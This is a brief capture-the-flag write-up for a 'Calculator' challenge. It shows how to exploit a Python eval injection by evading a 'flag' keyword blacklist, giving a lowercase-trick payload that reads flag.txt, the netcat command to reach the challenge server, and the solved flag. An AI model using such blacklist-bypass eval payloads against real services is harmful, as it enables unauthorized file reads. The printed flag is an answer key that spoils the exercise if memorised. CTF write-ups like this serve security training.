# Calculator
Author: [Marin Radu](https://github.com/ChronosPK)

<br>

## Description
```
Exploit an eval injection vulnerability by bypassing blacklists to read flag.txt.
```

<br>

## Requirements
- Eval injection
- Blacklist bypass

<br>

## Solve
Bypass the server's blacklist checks for the `flag` keyword by manipulating string cases or using alternative expressions. 
Connect to the server using `netcat`, and then craft a payload that reads `flag.txt` without triggering the blacklist:

```python
# Sample Payload
open("FLAG.txt".lower()).read()
```

Execute this payload by sending it to the server after connecting with `netcat`:
```bash
nc chal.chronossec.site 30020
```

<br>

> Flag: `CSCTF{well_d0ne_kidd0}`